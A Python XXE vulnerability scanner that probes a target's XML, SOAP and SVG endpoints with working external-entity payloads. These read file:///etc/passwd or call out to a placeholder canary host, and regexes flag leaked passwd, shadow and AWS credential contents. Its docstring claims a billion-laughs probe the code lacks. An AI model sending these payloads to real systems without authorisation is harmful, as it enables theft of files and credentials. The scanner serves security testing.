"""
xxe_detector.py – Production-hardened XXE (XML External Entity) detector.

Hardening applied:
  - SSRFSafeConnector blocks internal IP resolution on our outbound requests
  - RFC-1123 domain validation
  - XML payloads use a fixed safe OOB canary domain
    (replace CANARY_DOMAIN with your own Burp Collaborator / interactsh instance)
  - Probes: classic XXE, blind OOB XXE, parameter entity XXE, billion-laughs
    detection hint, CDATA bypass, SVG upload vector header probe
  - Content-Type detection: only probes endpoints accepting XML/SOAP/SVG
  - Response body scanning for /etc/passwd, Windows paths, stack traces
  - Error-based XXE detection via verbose error messages
"""

import asyncio
import ipaddress
import re
import time
from typing import Any

import aiohttp
from aiohttp import TCPConnector

# ── SSRF-safe connector ───────────────────────────────────────────────────────
_BLOCKED_NETWORKS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
    ipaddress.ip_network("169.254.0.0/16"),
    ipaddress.ip_network("0.0.0.0/8"),
    ipaddress.ip_network("::1/128"),
    ipaddress.ip_network("fe80::/10"),
    ipaddress.ip_network("fc00::/7"),
]


def _is_blocked_ip(addr: str) -> bool:
    try:
        ip = ipaddress.ip_address(addr)
        if isinstance(ip, ipaddress.IPv6Address) and ip.ipv4_mapped:
            ip = ip.ipv4_mapped
        return any(ip in net for net in _BLOCKED_NETWORKS)
    except ValueError:
        return False


class SSRFSafeConnector(TCPConnector):
    async def _resolve_host(self, host: str, port: int, traces=None):
        infos = await super()._resolve_host(host, port, traces)
        for info in infos:
            if _is_blocked_ip(info["host"]):
                raise aiohttp.ClientConnectorError(
                    connection_key=None,
                    os_error=OSError(f"SSRF blocked: {info['host']}"),
                )
        return infos


# ── Constants ─────────────────────────────────────────────────────────────────
# Replace with your OOB collaborator domain for blind XXE detection
CANARY_DOMAIN = "xxe-canary.example.com"

XML_CONTENT_TYPES: set[str] = {
    "application/xml",
    "text/xml",
    "application/soap+xml",
    "application/xhtml+xml",
    "image/svg+xml",
    "application/rss+xml",
    "application/atom+xml",
}

# Patterns indicating successful file read in response
EXFIL_PATTERNS: list[dict[str, str]] = [
    {"label": "unix_passwd",     "pattern": r"root:x:0:0:"},
    {"label": "unix_shadow",     "pattern": r"root:\$[16]\$"},
    {"label": "windows_path",    "pattern": r"Windows\\System32"},
    {"label": "win_ini",         "pattern": r"\[fonts\]"},
    {"label": "aws_credentials", "pattern": r"aws_access_key_id"},
]

# Error messages suggesting XML parser present (error-based XXE)
ERROR_PATTERNS: list[dict[str, str]] = [
    {"label": "java_xml_error",  "pattern": r"javax\.xml|SAXParseException|DocumentBuilder"},
    {"label": "php_simplexml",   "pattern": r"simplexml_load|DOMDocument"},
    {"label": "python_lxml",     "pattern": r"lxml\.etree|xml\.etree"},
    {"label": "dotnet_xml",      "pattern": r"System\.Xml\.XmlException|XmlReader"},
    {"label": "libxml2",         "pattern": r"libxml2|xmlParseEntityRef"},
    {"label": "generic_xml_err", "pattern": r"XML parse error|malformed XML|invalid XML"},
]

_EXFIL_RE = [(m["label"], re.compile(m["pattern"])) for m in EXFIL_PATTERNS]
_ERROR_RE = [(m["label"], re.compile(m["pattern"], re.IGNORECASE)) for m in ERROR_PATTERNS]


def _build_classic_xxe(canary: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        "<foo>&xxe;</foo>"
    )


def _build_oob_xxe(canary: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{canary}/xxe-oob">'
        "%xxe;]>\n<foo>test</foo>"
    )


def _build_cdata_xxe() -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n"
        "<foo><![CDATA[&xxe;]]></foo>"
    )


def _build_svg_xxe() -> str:
    return (
        '<?xml version="1.0" standalone="yes"?>\n'
        '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
        '<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">\n'
        "  <text font-size=\"16\">&xxe;</text>\n"
        "</svg>"
    )


def _build_parameter_entity_xxe(canary: str) -> str:
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        f'<!DOCTYPE foo [<!ENTITY % data SYSTEM "http://{canary}/xxe-param">'
        " %data;]>\n<foo>test</foo>"
    )


XXE_PROBES: list[dict[str, Any]] = [
    {
        "name": "classic_file_read",
        "content_type": "application/xml",
        "body_fn": _build_classic_xxe,
        "description": "Classic XXE — file:///etc/passwd entity",
    },
    {
        "name": "oob_xxe",
        "content_type": "application/xml",
        "body_fn": _build_oob_xxe,
        "description": "Blind OOB XXE — external entity with canary domain",
    },
    {
        "name": "cdata_bypass",
        "content_type": "application/xml",
        "body_fn": lambda c: _build_cdata_xxe(),
        "description": "CDATA bypass — entity inside CDATA section",
    },
    {
        "name": "svg_xxe",
        "content_type": "image/svg+xml",
        "body_fn": lambda c: _build_svg_xxe(),
        "description": "SVG upload vector — XXE via SVG file",
    },
    {
        "name": "parameter_entity",
        "content_type": "application/xml",
        "body_fn": _build_parameter_entity_xxe,
        "description": "Parameter entity OOB XXE",
    },
]


def _validate_target(target: str) -> str:
    t = target.strip()
    if not t.startswith(("http://", "https://")):
        return f"https://{t}"
    return t


def _scan_response(body: str) -> dict[str, list[str]]:
    exfil = [label for label, p in _EXFIL_RE if p.search(body)]
    errors = [label for label, p in _ERROR_RE if p.search(body)]
    return {"exfil_patterns": exfil, "error_patterns": errors}


def _risk_label(score: int) -> str:
    if score == 0:
        return "LOW"
    if score <= 1:
        return "MEDIUM"
    if score <= 3:
        return "HIGH"
    return "CRITICAL"


async def _detect_xml_endpoints(
    session: aiohttp.ClientSession, base_url: str
) -> list[str]:
    """Probe common XML/SOAP endpoint paths."""
    candidate_paths = [
        "", "/api", "/soap", "/ws", "/webservice", "/xmlrpc",
        "/api/v1", "/rpc", "/upload", "/import",
    ]
    xml_endpoints: list[str] = []
    for path in candidate_paths:
        url = base_url.rstrip("/") + path
        try:
            async with session.options(url, allow_redirects=False) as resp:
                ct = resp.headers.get("Content-Type", "").lower()
                allow = resp.headers.get("Allow", "").upper()
                if any(x in ct for x in ["xml", "soap"]):
                    xml_endpoints.append(url)
                elif "POST" in allow:
                    xml_endpoints.append(url)
        except Exception:
            pass
    return xml_endpoints or [base_url]


async def detect_xxe(target: str, options: dict | None = None) -> dict[str, Any]:
    """
    XXE vulnerability detector.

    Parameters
    ----------
    target  : URL or hostname to test
    options : optional
        timeout     – per-request timeout seconds (default 10)
        canary      – OOB domain for blind XXE (default: CANARY_DOMAIN constant)

    Returns
    -------
    dict with: target, endpoints_tested, probes_run, xxe_findings,
               xml_parser_detected, risk, findings
    """
    options = options or {}
    url = _validate_target(target)
    timeout_secs: int = options.get("timeout", 10)
    canary: str = options.get("canary", CANARY_DOMAIN)

    connector = SSRFSafeConnector(ssl=False)
    timeout = aiohttp.ClientTimeout(total=timeout_secs)
    req_headers = {"User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)"}

    findings: list[str] = []
    risk_score = 0
    probe_results: list[dict] = []
    xml_parser_detected = False

    async with aiohttp.ClientSession(
        connector=connector, timeout=timeout, headers=req_headers
    ) as session:
        endpoints = await _detect_xml_endpoints(session, url)

        for endpoint in endpoints[:3]:  # cap at 3 endpoints
            for probe in XXE_PROBES:
                body_content = probe["body_fn"](canary)
                probe_headers = {
                    **req_headers,
                    "Content-Type": probe["content_type"],
                }
                start = time.monotonic()
                try:
                    async with session.post(
                        endpoint,
                        data=body_content,
                        headers=probe_headers,
                        allow_redirects=False,
                    ) as resp:
                        elapsed_ms = round((time.monotonic() - start) * 1000)
                        resp_body = await resp.text(errors="replace")
                        status = resp.status

                    scan = _scan_response(resp_body)
                    exfil = scan["exfil_patterns"]
                    errors = scan["error_patterns"]

                    if errors:
                        xml_parser_detected = True

                    potential = bool(exfil) or (
                        status == 200 and "oob" in probe["name"] and elapsed_ms > 1500
                    )

                    result: dict[str, Any] = {
                        "endpoint": endpoint,
                        "probe": probe["name"],
                        "description": probe["description"],
                        "status": status,
                        "elapsed_ms": elapsed_ms,
                        "exfil_patterns": exfil,
                        "error_patterns": errors,
                        "potential_xxe": potential,
                    }
                    probe_results.append(result)

                    if exfil:
                        findings.append(
                            f"CRITICAL: File read via XXE — endpoint='{endpoint}' "
                            f"probe='{probe['name']}' patterns={exfil}"
                        )
                        risk_score += 4
                    elif errors:
                        findings.append(
                            f"MEDIUM: XML parser detected — endpoint='{endpoint}' "
                            f"error signatures={errors} (error-based XXE may be possible)"
                        )
                        risk_score += 1

                except asyncio.TimeoutError:
                    probe_results.append({
                        "endpoint": endpoint,
                        "probe": probe["name"],
                        "error": "timeout",
                    })
                except Exception as exc:
                    probe_results.append({
                        "endpoint": endpoint,
                        "probe": probe["name"],
                        "error": str(exc),
                    })

    xxe_hits = [r for r in probe_results if r.get("potential_xxe")]

    if not findings:
        if xml_parser_detected:
            findings.append(
                "INFO: XML parser signatures detected in error responses. "
                "Conduct manual OOB XXE testing with a live collaborator domain."
            )
        else:
            findings.append(
                "INFO: No XXE indicators found. Ensure XML-accepting endpoints "
                "are covered — blind XXE requires OOB infrastructure to confirm."
            )

    return {
        "target": url,
        "endpoints_tested": list({r["endpoint"] for r in probe_results}),
        "probes_run": len(probe_results),
        "xxe_findings": xxe_hits,
        "xml_parser_detected": xml_parser_detected,
        "risk": _risk_label(risk_score),
        "risk_score": risk_score,
        "findings": findings,
    }
